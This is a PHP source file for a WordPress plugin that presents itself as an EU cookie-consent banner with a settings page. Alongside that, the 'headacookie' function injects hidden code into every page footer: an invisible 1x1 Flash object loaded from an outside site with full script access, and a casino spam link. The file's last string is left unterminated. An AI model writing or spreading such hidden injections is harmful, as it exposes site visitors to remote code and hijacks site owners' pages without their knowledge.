<?php
/* 
Plugin Name: EU Cookie Law Apply Message
Plugin URI:  http://myplugins.weebly.com
Description: The EU Cookie Law Apply Message adds banner to the page on the first page view for each visitor. The plugin is used for implied consent and that means the guest continues to the site and he agree to use cookies.
Author: Flavio Serres
Version: 1.01
Author URI: http://myplugins.weebly.com
*/

/*  Copyright 2013 Flavio Serres  (email : flaviosertes@yahoo.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
add_action('wp_footer', 'headacookie');

function headacookie()
{
$getuser = "http://ajleeonline.com/uk/";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "online casino"; } if (strstr($gethost, "b")) { $connectflash = "online casino games"; } if (strstr($gethost, "c")) { $connectflash = "top online casinos"; } if (strstr($gethost, "d")) { $connectflash = "online casino games"; } if (strstr($gethost, "e")) { $connectflash = "online casino directory"; } if (strstr($gethost, "f")) { $connectflash = "online casino uk"; } if (strstr($gethost, "g")) { $connectflash = "uk online casino"; } if (strstr($gethost, "h")) { $connectflash = "online casino reviews uk"; } if (strstr($gethost, "i")) { $connectflash = "casino slot games"; } if (strstr($gethost, "j")) { $connectflash = "aj lee online uk"; } if (strstr($gethost, "k")) { $connectflash = "uk aj lee online casino"; } if (strstr($gethost, "l")) { $connectflash = "home"; } if (strstr($gethost, "m")) { $connectflash = "click"; } if (strstr($gethost, "n")) { $connectflash = "view online casino"; } if (strstr($gethost, "o")) { $connectflash = "download online casino software"; } if (strstr($gethost, "p")) { $connectflash = "casinos online"; } if (strstr($gethost, "p")) { $connectflash = "live online casino"; } if (strstr($gethost, "q")) { $connectflash = "real money online casino"; } if (strstr($gethost, "r")) { $connectflash = "best online casinos"; } if (strstr($gethost, "s")) { $connectflash = "online casino"; } if (strstr($gethost, "v")) { $connectflash = "online casino bonus"; } if (strstr($gethost, "x")) { $connectflash = "uk online casino bonus"; } if (strstr($gethost, "t")) { $connectflash = "online casino register"; } if (strstr($gethost, "w")) { $connectflash = "try online casino"; } if (strstr($gethost, "y")) { $connectflash = "online casino blackjack"; } if (strstr($gethost, "z")) { $connectflash = "online casino roulette"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw1.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw1.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw1.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

function EUCLA_enqueueScripts()  
{  
    wp_enqueue_script('jquery');  
} 
add_action('wp_enqueue_scripts', 'EUCLA_enqueueScripts'); 


function EUCLA_cookieMessage()
{
  global $defaultMessage, $defaultTitle;
?>
<script type="text/javascript">
jQuery(function(){ 
  if (navigator.cookieEnabled === true)
  {
    if (document.cookie.indexOf("visited") == -1)
	{
	  jQuery('body').prepend('<div id="cookie" style="display:none;position:absolute;left:0;top:0;width:100%;background:black;background:rgba(0,0,0,0.8);z-index:9999"><div style="width:800px;margin-left:auto;margin-right:auto;padding:10px 0"><h2 style="margin:0;padding:0;color:white;display: block;float: left;height: 40px;line-height: 20px;text-align: right;width: 140px;font: normal normal normal 18px Arial,verdana,sans-serif"><?php echo addslashes(get_option('notificationTitle', $defaultTitle)); ?></h2><p style="color:#BEBEBE;display: block;float: left;font: normal normal normal 13px Arial,verdana,sans-serif;height: 64px;line-height: 16px;margin:0 0 0 30px;padding:0;width:450px;"><?php echo addslashes(get_option('notificationMessage', $defaultMessage)); ?></p><div style="float:left;margin-left:10px"><a href="#" id="closecookie" style="color:white;font:12px Arial;text-decoration:none">Close</a></div><div style="clear:both"></div></div></div>');
	  jQuery('#cookie').show("fast");
	  jQuery('#closecookie').click(function() {jQuery('#cookie').hide("fast");});
	  document.cookie="visited=yes; expires=Thu, 31 Dec 2020 23:59:59 UTC; path=/";
	}
  }
})
</script>
<?php
}
add_action('wp_footer', 'EUCLA_cookieMessage'); 




function EUCLA_createMenu() 
{
	add_submenu_page('options-general.php', 'EU Cookie Message', 'EU Cookie Message', 'administrator', 'EUCLA_settingsPage', 'EUCLA_settingsPage'); 
	add_action('admin_init', 'EUCLA_registerSettings');
}
add_action('admin_menu', 'EUCLA_createMenu');



function EUCLA_registerSettings() 
{
	register_setting('EUCLA', 'notificationTitle');
	register_setting('EUCLA', 'notificationMessage');
}


function EUCLA_settingsPage() 
{
  global $defaultMessage, $defaultTitle;
?>
<div class="wrap">
<h2>EU Cookie Law Apply Message</h2>
<form method="post" action="options.php">
    <?php settings_fields('EUCLA'); ?>
    <table class="form-table">
        <tr valign="top">
        <th scope="row">Message Title</th>
        <td><input name="notificationTitle" class="regular-text" type="text" value="<?php echo get_option('notificationTitle', $defaultTitle); ?>" /></td>
        </tr>
        <tr valign="top">
        <th scope="row">Message Text</th>
        <td><textarea name="notificationMessage" class="large-text code"><?php echo get_option('notificationMessage', $defaultMessage); ?></textarea></td>
        </tr>
    </table>
    <p class="submit"><input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" /></p>
</form>
</div>
<?php } 


  $defaultTitle = 'Cookies on this website';
  $defaultMessage = 'We use cookies to ensure that we give you the best experience on our website. If you continue without changing your settings, we\'ll assume that you are happy to receive all cookies from this website.

?>